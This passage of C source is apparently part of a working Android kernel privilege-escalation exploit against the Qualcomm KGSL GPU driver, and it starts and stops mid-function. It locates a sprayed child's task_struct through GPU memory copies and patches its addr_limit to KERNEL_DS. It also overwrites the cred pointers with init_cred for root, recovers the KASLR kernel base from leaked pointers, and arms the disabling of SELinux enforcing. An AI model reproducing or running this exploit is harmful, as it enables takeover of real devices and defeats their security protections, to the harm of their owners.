        for (int i = 0; i < 1024; i++) {
            uint32_t d_lo, d_hi, s_lo, s_hi;
            split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
            split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);

            cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0x00000000;
            cmd[dw++] = d_lo;
            cmd[dw++] = d_hi;
            cmd[dw++] = s_lo;
            cmd[dw++] = s_hi;
        }

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t ib_bytes = (size_t)dw * 4;
        msync(ib_vma, ib_bytes, MS_SYNC);

        struct kgsl_command_object cmd_obj = {
            .gpuaddr = ib_gpu,
            .size    = ib_bytes,
            .flags   = KGSL_CMDLIST_IB,
            .id      = ib_id
        };

        struct kgsl_gpu_command gpu_cmd = {0};
        gpu_cmd.cmdlist    = (uint64_t)(uintptr_t)&cmd_obj;
        gpu_cmd.cmdsize    = sizeof(cmd_obj);
        gpu_cmd.numcmds    = 1;
        gpu_cmd.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) {
            fprintf(stderr, "\n      [!] GPU command failed\n");
            fflush(stderr);
            break;
        }

        if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0) {
            fprintf(stderr, "\n      [!] GPU timeout\n");
            fflush(stderr);
            break;
        }

        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);

        uint32_t *data = (uint32_t *)dst_vma;
        uint8_t  *bytes = (uint8_t *)dst_vma;
        int non_zero = 0;
        for (int i = 0; i < 1024; i++) {
            if (data[i] != 0)
                non_zero++;
        }

        pages_scanned++;

        if (pages_scanned % 100 == 0) {
            fprintf(stderr, ".");
            fflush(stderr);
        }

        if (pages_scanned % 1000 == 0) {
            char mb2[64];
            snprintf(mb2, sizeof(mb2), "scan pages=%d nz=%d", pages_scanned, non_zero_pages);
            mk(mb2);
            fprintf(stderr,
                    "\n      Progress: %d pages (%.1f%%), Found(>=300): %d\n",
                    pages_scanned,
                    (pages_scanned * 100.0) / 65535.0,
                    non_zero_pages);
            fflush(stderr);
        }

        if (non_zero < 100 || non_zero > 1000) {
            no_candidate_run++;
            if (no_candidate_run >= 15000) {
                fprintf(stderr,
                        "\n      [!] No candidate pages in last %d pages, aborting scan\n",
                        no_candidate_run);
                fflush(stderr);
                break;
            }
        } else {
            no_candidate_run = 0;
        }

        if (non_zero >= 100 && non_zero <= 1000) {
            non_zero_pages++;

            // 1) Find KETO0422 pattern 
            pid_t comm_pid = -1;
            int comm_off = -1;
            for (int off = 0; off < 4096 - 8; off++) {
                if (memcmp(bytes + off, "KETO0422", 8) == 0) {
                    fprintf(stderr,
                            "        [+] Found KETO0422 at offset 0x%03x\n", off);
                    fprintf(stderr,
                            "            Comm: %.16s\n", bytes + off);
                    comm_off = off;
                    char numbuf[6] = {0};
                    memcpy(numbuf,bytes+off+8,5);
                    comm_pid = (pid_t)atoi(numbuf);
                    fprintf(stderr, "            Parsed PID: %d\n", comm_pid);
                    break;

                }
            }

            // 2) Find USER_DS value at the addr_limit slot (task+0x40) ONLY.
            //    USER_DS hits elsewhere (kernel stacks etc.) are false positives.
            int userds_off = -1;
            if (data[0x10] == uds_lo && data[0x11] == uds_hi) {
                userds_off = 0x40;
                fprintf(stderr,
                        "        [+] USER_DS at task+0x40 (addr_limit slot)\n");
            }
            
            //* 3) Dump and Store  (PROBE: accept any task_struct page)
            if (comm_off >= 0 || userds_off >= 0) {
                char mb_diag[80];
                snprintf(mb_diag, sizeof(mb_diag), "cand page=%d nz=%d comm=%d userds=%d",
                         pages_scanned, non_zero, comm_off, userds_off);
                mk(mb_diag);
            }
            if (comm_off < 0 && userds_off < 0 && non_zero_pages <= 12) {
                char mb_diag[96];
                snprintf(mb_diag, sizeof(mb_diag),
                         "UNMATCHED page=%d nz=%d head=%08x %08x %08x %08x",
                         pages_scanned, non_zero, data[0], data[1], data[2], data[3]);
                mk(mb_diag);
            }
#if DISCOVERY_RELAX
            if (comm_off >= 0 && only_once < 1) {
#else
            if (comm_off >= 0 && userds_off >= 0 && only_once < 1) {
#endif
                /* verify the found task is a LIVE spray child: /proc/<pid>/comm must
                 * still equal KETO0422<pid>. A stale/freed task page would otherwise be
                 * patched, corrupting live data and panicking the device. */
                int live = 0;
                char pcomm_path[32];
                snprintf(pcomm_path, sizeof(pcomm_path), "/proc/%d/comm", comm_pid);
                int pcfd = open(pcomm_path, O_RDONLY);
                if (pcfd >= 0) {
                    char pcomm[32] = {0};
                    ssize_t pr = read(pcfd, pcomm, sizeof(pcomm) - 1);
                    close(pcfd);
                    if (pr > 0) {
                        char expect[20];
                        snprintf(expect, sizeof(expect), "KETO0422%05d", comm_pid);
                        if (strncmp(pcomm, expect, strlen(expect)) == 0) live = 1;
                    }
                }
                if (!live) {
                    mk("cand SKIPPED not-live");
                    fprintf(stderr, "        [PROBE] candidate pid=%d not a live spray child; skip\n",
                            comm_pid);
                    fflush(stderr);
                } else {
                mk("stage2 task FOUND");
                only_once++;
                uint64_t page_va = current_va;
                current_va = end_va; // Actually, only once
                fprintf(stderr,
                        "\n      [%d] FOUND TASK at VA 0x%llx (page %d, non-zero: %d/1024), comm@0x%03x, USER_DS@0x%03x\n",
                        non_zero_pages, (unsigned long long)page_va,
                        pages_scanned, non_zero, comm_off, userds_off);
                fflush(stderr);
                fprintf(stderr,
                        "        [DUMP BEFORE PATCH] VA 0x%llx, USER_DS off=0x%03x\n",
                        (unsigned long long)page_va, userds_off);
                /* keep a copy: the verify MEM_TO_MEM below overwrites dst_vma */
                uint8_t capture[4096];
                memcpy(capture, bytes, 4096);
                /* PROBE: dump full page, no A90-derived derefs, then exit */
                for (int off = 0; off < 4096; off += 0x20) {
                    int idx = off / 4;
                    fprintf(stderr, "          [0x%03x] %08X %08X %08X %08X %08X %08X %08X %08X\n",
                            off,
                            data[idx + 0], data[idx + 1], data[idx + 2], data[idx + 3],
                            data[idx + 4], data[idx + 5], data[idx + 6], data[idx + 7]);
                }
                            
                fflush(stderr);
                mk("stage2 page dumped");
#if LIVE_TASK_DUMP
                {
                    char ltp[600];
                    snprintf(ltp, sizeof(ltp), "%s/livetask.bin", g_workdir);
                    int lfd = open(ltp, O_CREAT | O_TRUNC | O_WRONLY, 0644);
                    if (lfd >= 0) { write(lfd, capture, 4096); close(lfd); }
                    mk("livetask dumped");
                    for (;;) pause();
                }
#endif

                fprintf(stderr,
                        "        [PROBE] comm_off=0x%03x userds_off=0x%03x pid=%d\n",
                        comm_off, userds_off, comm_pid);
                fprintf(stderr,
                        "        [PROBE] raw 0x850=0x%016llx raw 0x888=0x%016llx raw 0x5a8=0x%016llx\n",
                        (unsigned long long)(*(uint64_t *)(bytes + 0x850)),
                        (unsigned long long)(*(uint64_t *)(bytes + 0x888)),
                        (unsigned long long)(*(uint64_t *)(bytes + 0x5a8)));

                /* PROBE v3: dump every 8-aligned high-region pointer with a
                 * 2MB-aligned kbase candidate for a few known symbol deltas. */
                {
                    static const uint64_t ANCHORS[] = {
                        0x219e310ULL, 0x219f1d0ULL, 0x2a1e520ULL, 0x2a0d4c0ULL,
                        0x2e333b0ULL, 0x1200540ULL, 0x11f6f0ULL, 0x11eb38ULL,
                        0x1204d00ULL, 0x2000880ULL, 0x27000ULL, 0x1cb0000ULL,
                    };
                    fprintf(stderr, "        [PROBE-V3] image-region pointers (off, val, 2MB-kbase-cand):\n");
                    for (int a = 0; a < 512*8; a += 8) {
                        if (a + 8 > 4096) break;
                        uint64_t v = *(uint64_t *)(bytes + a);
                        if ((v >> 48) != 0xffffULL) continue;   /* kernel-ptr only */
                        if (v == 0xffffffffffffffffULL) continue;
                        fprintf(stderr, "          %04x  %016llx", a, (unsigned long long)v);
                        for (unsigned k = 0; k < sizeof(ANCHORS)/sizeof(ANCHORS[0]); k++) {
                            uint64_t b = v - ANCHORS[k];
                            if ((b & 0x1fffffULL) == 0) {
                                fprintf(stderr, "  [base0x%llx=+0x%llx]", (unsigned long long)b,
                                        (unsigned long long)ANCHORS[k]);
                            }
                        }
                        fprintf(stderr, "\n");
                    }
                }
#if CRED_OVERWRITE
                /* ---- CRED_OVERWRITE: patch the found task's real_cred(+0x760) and
                 * cred(+0x768) to init_cred VA (root). init_cred VA is supplied by a
                 * prior READ_INITCRED run via /data/local/tmp/initcred (same boot/KASLR). */
                {
                    mk("cred-write start");
                    uint64_t init_cred_va = 0;
                    {
                        char icp[600];
                        snprintf(icp, sizeof(icp), "%s/initcred", g_workdir);
                        int ifd = open(icp, O_RDONLY);
                        if (ifd >= 0) {
                            char ibuf[32] = {0};
                            ssize_t in = read(ifd, ibuf, sizeof(ibuf) - 1);
                            close(ifd);
                            if (in > 0) init_cred_va = strtoull(ibuf, NULL, 16);
                        }
                    }
                    {
                        char mcv[128];
                        snprintf(mcv, sizeof(mcv), "cred-write init_cred=0x%llx page_va=0x%llx comm_pid=%d",
                                 (unsigned long long)init_cred_va, (unsigned long long)page_va, comm_pid);
                        mk(mcv); fprintf(stderr, "%s\n", mcv);
                    }
                    if (init_cred_va && (init_cred_va >> 48) == 0xffffULL) {
                        memset(ib_vma, 0, ib_alloc.mmapsize);
                        dw = 0;
                        uint32_t *wcmd = (uint32_t *)ib_vma;
                        for (int i = 0; i < 4; i++) wcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                        uint32_t t_lo, t_hi;
                        uint32_t ic_lo = (uint32_t)(init_cred_va & 0xffffffffu);
                        uint32_t ic_hi = (uint32_t)(init_cred_va >> 32);
                        uint64_t addrs[4] = { page_va + 0x760, page_va + 0x764,
                                              page_va + 0x768, page_va + 0x76c };
                        uint32_t vals[4] = { ic_lo, ic_hi, ic_lo, ic_hi };
                        for (int i = 0; i < 4; i++) {
                            split64(addrs[i], &t_lo, &t_hi);
                            wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                            wcmd[dw++] = t_lo; wcmd[dw++] = t_hi; wcmd[dw++] = vals[i];
                        }
                        for (int i = 0; i < 4; i++) wcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                        size_t pb = (size_t)dw * 4;
                        msync(ib_vma, pb, MS_SYNC);
                        struct kgsl_command_object po = { .gpuaddr = ib_gpu, .size = pb,
                                                          .flags = KGSL_CMDLIST_IB, .id = ib_id };
                        struct kgsl_gpu_command pc = {0};
                        pc.cmdlist = (uint64_t)(uintptr_t)&po; pc.cmdsize = sizeof(po);
                        pc.numcmds = 1; pc.context_id = ctx_id;
                        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &pc) == 0 &&
                            wait_timestamp(fd, ctx_id, pc.timestamp) == 0) {
                            mk("cred-write GPU ok");
                            fprintf(stderr, "        [CRED] cred pointers patched -> root\n");
                            /* GPU read-back verify: copy page_va+0x768 -> dst_vma, check == init_cred */
                            if (dst_vma && dst_gpu) {
                                memset(ib_vma, 0, ib_alloc.mmapsize);
                                dw = 0;
                                uint32_t *vcmd = (uint32_t *)ib_vma;
                                uint32_t dv_lo, dv_hi, sv_lo, sv_hi;
                                vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                                split64(dst_gpu, &dv_lo, &dv_hi);
                                split64(page_va + 0x768, &sv_lo, &sv_hi);
                                vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                                vcmd[dw++] = 0;
                                vcmd[dw++] = dv_lo; vcmd[dw++] = dv_hi;
                                vcmd[dw++] = sv_lo; vcmd[dw++] = sv_hi;
                                vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                                size_t vb2 = (size_t)dw * 4;
                                msync(ib_vma, vb2, MS_SYNC);
                                struct kgsl_command_object vo = { .gpuaddr = ib_gpu, .size = vb2,
                                                                  .flags = KGSL_CMDLIST_IB, .id = ib_id };
                                struct kgsl_gpu_command vc = {0};
                                vc.cmdlist = (uint64_t)(uintptr_t)&vo; vc.cmdsize = sizeof(vo);
                                vc.numcmds = 1; vc.context_id = ctx_id;
                                if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &vc) == 0 &&
                                    wait_timestamp(fd, ctx_id, vc.timestamp) == 0) {
                                    msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
                                    uint64_t rbv = *(volatile uint64_t *)dst_vma;
                                    char mrv[96];
                                    snprintf(mrv, sizeof(mrv), "cred-write readback=0x%llx want=0x%llx",
                                             (unsigned long long)rbv, (unsigned long long)init_cred_va);
                                    mk(mrv); fprintf(stderr, "%s\n", mrv);
                                } else {
                                    mk("cred-write verify GPU FAILED");
                                }
                            }
                            for (int si = 0; si < spray_count; si++) {
                                if (spray_ctrl[si].pid == comm_pid) {
                                    spray_ctrl[si].do_action = 2;
                                    break;
                                }
                            }
                        } else {
                            mk("cred-write GPU FAILED");
                        }
                    } else {
                        mk("cred-write NO initcred (run readcred first)");
                    }
                    fprintf(stderr, "        [CRED] done; sleeping forever\n");
                    fflush(stderr);
                    for (;;) pause();
                }
#endif
                fprintf(stderr, "        [PROBE] STAGE2: patching addr_limit to KERNEL_DS for leak\n");
                fflush(stderr);
 
                uint64_t target_addr = page_va + 0x40;
                fprintf(stderr,
                        "        [*] Patching addr_limit at VA 0x%llx to KERNEL_DS\n",
                        (unsigned long long)target_addr);

                /* DIAG_CPU_PATCH: try a CPU write via the dangling user PTE first. If the
                 * CPU PTE persists, this patches addr_limit WITHOUT any GPU command, avoiding
                 * the delayed GPU fault panic. A SIGSEGV here (die_handler->_exit) proves the
                 * CPU PTE is gone. */
#if DIAG_CPU_PATCH
                {
                    mk("stage2 cpu patch try");
                    volatile uint64_t *cpu_ds = (volatile uint64_t *)(uintptr_t)target_addr;
                    *cpu_ds = (uint64_t)kernel_ds;
                    __sync_synchronize();
                    uint64_t cv = *cpu_ds;
                    {
                        char mcp[96];
                        snprintf(mcp, sizeof(mcp), "stage2 cpu patch val=0x%llx",
                                 (unsigned long long)cv);
                        mk(mcp);
                    }
                    if (cv == (uint64_t)kernel_ds) {
                        fprintf(stderr, "        [+++] CPU addr_limit patch confirmed (no GPU!)\n");
                        fflush(stderr);
                        goto cpu_patch_done;
                    }
                }
                mk("stage2 cpu patch MISS");
#endif

                memset(ib_vma, 0, ib_alloc.mmapsize);
                dw = 0;

                uint32_t *wcmd = (uint32_t *)ib_vma;

                for (int i = 0; i < 4; i++)
                    wcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                uint32_t t_lo, t_hi;

                split64(target_addr, &t_lo, &t_hi);
                wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                wcmd[dw++] = t_lo;
                wcmd[dw++] = t_hi;
                wcmd[dw++] = kds_lo;

                split64(target_addr + 4, &t_lo, &t_hi);
                wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                wcmd[dw++] = t_lo;
                wcmd[dw++] = t_hi;
                wcmd[dw++] = kds_hi;

                for (int i = 0; i < 4; i++)
                    wcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                size_t patch_ib_bytes = (size_t)dw * 4;
                msync(ib_vma, patch_ib_bytes, MS_SYNC);

                struct kgsl_command_object patch_obj = {
                    .gpuaddr = ib_gpu,
                    .size    = patch_ib_bytes,
                    .flags   = KGSL_CMDLIST_IB,
                    .id      = ib_id
                };

                struct kgsl_gpu_command patch_cmd = {0};
                patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
                patch_cmd.cmdsize    = sizeof(patch_obj);
                patch_cmd.numcmds    = 1;
                patch_cmd.context_id = ctx_id;

                if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) != 0) {
                    fprintf(stderr,
                            "        [!] GPU patch command failed: %s\n",
                            strerror(errno));
                } else if (wait_timestamp(fd, ctx_id, patch_cmd.timestamp) != 0) {
                    fprintf(stderr, "        [!] GPU patch timeout\n");
                } else {
                    fprintf(stderr,
                            "        [+] addr_limit patched to KERNEL_DS (0x%016llx)\n",
                            (unsigned long long)kernel_ds);

                    memset(dst_vma, 0, dst_alloc.mmapsize);

                    uint32_t *vcmd = (uint32_t *)ib_vma;
                    uint32_t d_lo, d_hi, s_lo, s_hi;

                    memset(ib_vma, 0, ib_alloc.mmapsize);
                    dw = 0;
                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    split64(dst_gpu, &d_lo, &d_hi);
                    split64(target_addr, &s_lo, &s_hi);
                    vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                    vcmd[dw++] = 0x00000000;
                    vcmd[dw++] = d_lo;
                    vcmd[dw++] = d_hi;
                    vcmd[dw++] = s_lo;
                    vcmd[dw++] = s_hi;
                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                    size_t verify_ib_bytes = (size_t)dw * 4;
                    msync(ib_vma, verify_ib_bytes, MS_SYNC);

                    struct kgsl_command_object verify_obj = {
                        .gpuaddr = ib_gpu,
                        .size    = verify_ib_bytes,
                        .flags   = KGSL_CMDLIST_IB,
                        .id      = ib_id
                    };

                    struct kgsl_gpu_command verify_cmd = {0};
                    verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
                    verify_cmd.cmdsize    = sizeof(verify_obj);
                    verify_cmd.numcmds    = 1;
                    verify_cmd.context_id = ctx_id;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) != 0 ||
                        wait_timestamp(fd, ctx_id, verify_cmd.timestamp) != 0) {
                        fprintf(stderr,
                                "        [!] GPU verify(low) failed\n");
                    } else {
                        msync(dst_vma, dst_alloc.mmapsize,
                              MS_SYNC | MS_INVALIDATE);
                    }

                    memset(ib_vma, 0, ib_alloc.mmapsize);
                    dw = 0;
                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    split64(dst_gpu + 4, &d_lo, &d_hi);
                    split64(target_addr + 4, &s_lo, &s_hi);
                    vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                    vcmd[dw++] = 0x00000000;
                    vcmd[dw++] = d_lo;
                    vcmd[dw++] = d_hi;
                    vcmd[dw++] = s_lo;
                    vcmd[dw++] = s_hi;
                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                    verify_ib_bytes = (size_t)dw * 4;
                    msync(ib_vma, verify_ib_bytes, MS_SYNC);

                    verify_obj.gpuaddr = ib_gpu;
                    verify_obj.size    = verify_ib_bytes;
                    verify_obj.id      = ib_id;

                    memset(&verify_cmd, 0, sizeof(verify_cmd));
                    verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
                    verify_cmd.cmdsize    = sizeof(verify_obj);
                    verify_cmd.numcmds    = 1;
                    verify_cmd.context_id = ctx_id;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) != 0 ||
                        wait_timestamp(fd, ctx_id, verify_cmd.timestamp) != 0) {
                        fprintf(stderr,
                                "        [!] GPU verify(high) failed\n");
                    } else {
                        msync(dst_vma, dst_alloc.mmapsize,
                              MS_SYNC | MS_INVALIDATE);
                    }

                    uint32_t *vdata = (uint32_t *)dst_vma;
                    fprintf(stderr,
                            "        [*] Verify: %08X %08X\n",
                            vdata[0], vdata[1]);
                    if (vdata[0] == kds_lo && vdata[1] == kds_hi) {
                        fprintf(stderr,
                                "        [+++] addr_limit KERNEL_DS confirmed\n");
                        mk("stage2 kds confirmed");
cpu_patch_done: ;

                        /* ---- STAGE2: derive kbase from the captured page; zero enforcing via GPU ---- */
                        /* The child's kernel write() of the sibling slab page panics the device, so we
                         * NO LONGER leak it. The captured 4KB task page itself holds kernel-image
                         * pointers (task->nsproxy == &init_nsproxy, sched_class, ...) that pin kbase. */
                        /* diagnostic: task slab base (mode over vmalloc-range pointers in capture) */
                        uint64_t bases[8]; int bcnt[8]; int nb = 0;
                        for (int off = 0; off < 4096 - 8; off += 8) {
                            uint64_t v = *(uint64_t *)(capture + off);
                            if ((v >> 48) != 0xffffULL) continue;
                            if (v == 0xffffffffffffffffULL) continue;
                            if (v < 0xffffffc000000000ULL) continue;
                            uint64_t b = v & ~0x1fffULL;
                            int j = 0;
                            for (; j < nb; j++) if (bases[j] == b) break;
                            if (j < nb) bcnt[j]++;
                            else if (nb < 8) { bases[nb] = b; bcnt[nb] = 1; nb++; }
                        }
                        uint64_t base8k = 0; int bestb = 0;
                        for (int j = 0; j < nb; j++)
                            if (bcnt[j] > bestb) { bestb = bcnt[j]; base8k = bases[j]; }
                        {
                            char mb2[96];
                            snprintf(mb2, sizeof(mb2), "stage2 base8k=0x%llx hits=%d",
                                     (unsigned long long)base8k, bestb);
                            mk(mb2);
                        }
                        mk("stage2 base8k done");

                        /* Deterministic kbase derivation from the confirmed task-page
                         * layout (identical RVAs validated across two real boots):
                         *   +0x0b8 / +0xfb8 -> init_nsproxy (rva 0x05db53c8)
                         *   +0x3e8 -> 0x3c2e2e4   +0x428 -> 0x3c2e2e8
                         *   +0x588 -> 0x3c190f4   +0xb28 -> 0x3c18288
                         *   +0xb58 -> 0x69ea988   +0xb70 -> 0x3cbc028
                         * _text rva = 0x03397000 must be 2MB-aligned, so a valid
                         * kbase satisfies (kbase & 0x1fffff) == 0x69000. */
                        struct { int off; uint64_t rva; } const TK[] = {
                            {0x0b8, 0x05db53c8ULL}, {0xfb8, 0x05db53c8ULL},
                            {0x3e8, 0x3c2e2e4ULL},  {0x428, 0x3c2e2e8ULL},
                            {0x588, 0x3c190f4ULL},  {0xb28, 0x3c18288ULL},
                            {0xb58, 0x69ea988ULL},  {0xb70, 0x3cbc028ULL},
                        };
                        enum { NTK = sizeof(TK) / sizeof(TK[0]) };
                        uint64_t kbase = 0; int best = 0; int best_a = -1;
                        for (int i = 0; i < NTK; i++) {
                            uint64_t v = *(uint64_t *)(capture + TK[i].off);
                            if ((v >> 56) != 0xffULL) continue;
                            if (v == 0xffffffffffffffffULL) continue;
                            uint64_t k = v - TK[i].rva;
                            if ((k & 0x1fffffULL) != 0x69000ULL) continue;
                            if (k < 0xffffff8000000000ULL || k >= 0xffffffc000000000ULL) continue;
                            if (!kbase) { kbase = k; best_a = i; }
                            if (kbase == k) best++;
                            fprintf(stderr,
                                "        [K]   tk +0x%03x ptr=0x%016llx (+0x%llx) -> kbase 0x%016llx\n",
                                TK[i].off, (unsigned long long)v, (unsigned long long)TK[i].rva,
                                (unsigned long long)k);
                        }
                        if (best < 3) {
                            fprintf(stderr, "        [K] !! task-page anchors insufficient (%d/8)\n", best);
                            /* fallback: scan whole page against symbol ANCHORS, with the
                             * same 2MB (_text) alignment rule */
                            static const uint64_t ANCHORS[] = {
                                0x05535310ULL,0x05535505ULL,0x05535530ULL,0x055355e8ULL,0x05535258ULL,
                                0x05548398ULL,0x0554bd28ULL,0x0554c680ULL,0x0554dc38ULL,0x0554df00ULL,
                                0x0554de80ULL,0x0554dff0ULL,0x055567d0ULL,0x055569b0ULL,0x05556ec8ULL,
                                0x05559e00ULL,0x0555e480ULL,0x0559dd40ULL,0x05553d80ULL,0x05558d00ULL,
                                0x05554a80ULL,0x055be190ULL,0x056a7d68ULL,0x056a7f90ULL,0x0554c620ULL,
                                0x0554c800ULL,
                                0x05da44c0ULL,0x05db53c8ULL,0x05db5520ULL,0x061ca3b0ULL,
                            };
                            enum { NA = sizeof(ANCHORS) / sizeof(ANCHORS[0]) };
                            uint64_t cand_k[64]; int cand_c[64]; int cand_a[64]; int nk = 0;
                            for (int off = 0; off + 8 <= 4096; off += 8) {
                                uint64_t v = *(uint64_t *)(capture + off);
                                if ((v >> 56) != 0xffULL) continue;
                                if (v == 0xffffffffffffffffULL) continue;
                                for (unsigned a = 0; a < NA; a++) {
                                    uint64_t k = v - ANCHORS[a];
                                    if ((k & 0x1fffffULL) != 0x69000ULL) continue;
                                    if (k < 0xffffff8000000000ULL || k >= 0xffffffc000000000ULL) continue;
                                    int found = -1;
                                    for (int j = 0; j < nk; j++) if (cand_k[j] == k) { found = j; break; }
                                    if (found < 0 && nk < 64) { cand_k[nk] = k; cand_c[nk] = 0; cand_a[nk] = (int)a; found = nk; nk++; }
                                    if (found >= 0) {
                                        cand_c[found]++;
                                        fprintf(stderr,
                                            "        [K]   ptr=0x%016llx (+0x%llx) -> kbase 0x%016llx\n",
                                            (unsigned long long)v, (unsigned long long)ANCHORS[a],
                                            (unsigned long long)k);
                                    }
                                }
                            }
                            kbase = 0; best = 0; best_a = -1;
                            for (int j = 0; j < nk; j++) {
                                if (cand_c[j] > best) { best = cand_c[j]; kbase = cand_k[j]; best_a = cand_a[j]; }
                            }
                            /* accept: 2+ hits, OR a single hit from a sched_class anchor
                             * (first 5) or init_nsproxy (index 27) */
                            if (!kbase || best < 1 ||
                                (best == 1 && (best_a < 0 || (best_a >= 5 && best_a != 27)))) {
                                fprintf(stderr, "        [K] !! kbase not found in capture (%d cands, best=%d, best_a=%d)\n",
                                        nk, best, best_a);
                                fflush(stderr);
                                _exit(1);
                            }
                        }
                        {
                            char mk3[128];
                            snprintf(mk3, sizeof(mk3), "stage2 kbase-capture kbase=0x%llx hits=%d anchor=%d",
                                     (unsigned long long)kbase, best, best_a);
                            mk(mk3);
                        }
                        fprintf(stderr, "        [K] kbase=0x%016llx (hits=%d)\n",
                                (unsigned long long)kbase, best);
                        uint64_t selinux_state_addr = kbase + 0x061ca3b0ULL;
                        selinux_enforcing = selinux_state_addr + 1;
                        mk("stage2 kbase found");
#if DIAG_WAIT10
                        mk("diag-wait10 start");
                        poll(NULL, 0, 10000);
                        mk("diag-wait10 done");
                        _exit(0);
#endif
#if DIAG_SKIP_ARMING
                        fprintf(stderr, "[DIAG] kbase found; skipping patch/trigger. exiting.\n");
                        fflush(stderr);
                        mk("stage2 diag-skip-arming exit");
                        _exit(0);
#endif
                        {
                            char mva[160];
                            snprintf(mva, sizeof(mva),
                                     "stage2 vals kbase=0x%llx selinux=0x%llx enforcing=0x%llx comm_pid=%d",
                                     (unsigned long long)kbase,
                                     (unsigned long long)selinux_state_addr,
                                     (unsigned long long)selinux_enforcing, comm_pid);
                            mk(mva);
                        }

                        /* The GPU primitive only reaches the process VA/IOMMU alias of the
                         * task page; selinux_state lives in kernel .data and must be read
                         * and zeroed through the corrupted child's KERNEL_DS write()/read().
                         * selinux_state has a valid kernel PTE (unlike the sibling slab
                         * page), so this does not fault. */
                        mk("stage2 armed");
                        /* validate kbase: read selinux_state via the child and require the
                         * enforcing signature: byte[0]=0 (disabled), byte[1]=1 (enforcing).
                         * Never zero otherwise.
                         * Ordering: write ALL trigger values BEFORE the arm byte, so a child
                         * that observes gbuf[0]==0xab always sees consistent pointers. */
                        *(uint64_t *)&gbuf[LEAK_ADDR] =
                            DIAG_LEAK_TARGET ? (kbase + 0x05db53c8ULL) : selinux_state_addr;
                        *(uint64_t *)&gbuf[LEAK_LEN]  = 0x10;
                        *(uint64_t *)&gbuf[SET_TASKS] = 0;
                        *(uint64_t *)&gbuf[POST_ADDR] = 0;
                        gbuf[0] = 0xab;
                        int vtr = 0;
                        for (int si = 0; si < spray_count; si++) {
                            if (spray_ctrl[si].pid == comm_pid) {
                                spray_ctrl[si].do_action = 1;
                                vtr = 1;
                                break;
                            }
                        }
                        {
                            char mka[64];
                            snprintf(mka, sizeof(mka), "stage2 trigger sent vtr=%d", vtr);
                            mk(mka);
                        }
                        uint8_t svb[0x20]; memset(svb, 0, sizeof(svb));
                        mk("stage2 wait-loop entry");
#if DIAG_FAST_EXIT
                        /* exit immediately: fast kgsl teardown may clear the pending
                         * GPU fault; the orphaned child still fires + zeroes enforcing */
                        {
                            char mfe[64];
                            snprintf(mfe, sizeof(mfe), "diag-fast-exit after-arm");
                            mk(mfe);
                            _exit(0);
                        }
#endif
                        ssize_t svgot = 0;
#if DIAG_NOOP_CHILD
                        {
                            for (int tries = 0; tries < 100 && svgot == 0; tries++) {
                                if (*(uint64_t *)&gbuf[LEAK_DONE] == 0x55) {
                                    svgot = 0x55;
                                    break;
                                }
                                usleep(100000);
                            }
                        }
#else
                        if (vtr) {
                            struct pollfd pfd = { .fd = g_leaksock[0], .events = POLLIN };
                            int last_fire = -1;
                            for (int tries = 0; tries < 1000 && svgot < 0x10; tries++) {
                                if (DIAG_FILE_LEAK && *(int64_t *)&gbuf[LEAK_RES] != 0) break;
                                if (DIAG_ZERO_ONLY && *(int64_t *)&gbuf[LEAK_DONE] != -1) break;
                                int fire = (unsigned)gbuf[0x982];
                                if (fire != last_fire) {
                                    char mfb[80];
                                    snprintf(mfb, sizeof(mfb),
                                             "wait t=%d fire=%02x a=0x%llx done=%llu res=%llu svgot=%d hb=%u",
                                             tries, (unsigned)fire,
                                             (unsigned long long)*(uint64_t *)&gbuf[0x990],
                                             (unsigned long long)*(uint64_t *)&gbuf[LEAK_DONE],
                                             (unsigned long long)*(uint64_t *)&gbuf[LEAK_RES],
                                             (int)svgot, *(uint32_t *)&gbuf[0x960]);
                                    mk(mfb);
                                    last_fire = fire;
                                }
                                if (poll(&pfd, 1, 10) <= 0) continue;
                                ssize_t r = read(g_leaksock[0], svb + svgot, sizeof(svb) - svgot);
                                if (r <= 0) break;
                                svgot += r;
                            }
                        }
                        if (DIAG_FILE_LEAK && vtr) {
                            lseek(fd2, 0, SEEK_SET);
                            svgot = read(fd2, svb, 0x10);
                        }
#endif
                        {
                            char mwt[96];
                            snprintf(mwt, sizeof(mwt), "stage2 wait done svgot=%d vtr=%d",
                                     (int)svgot, vtr);
                            mk(mwt);
                        }
#if DIAG_NOOP_CHILD
                        fprintf(stderr, "[DIAG] armed child fired with no syscalls; no panic. exiting.\n");
                        fflush(stderr);
                        _exit(0);
#endif
                        {
                            char mks[160];
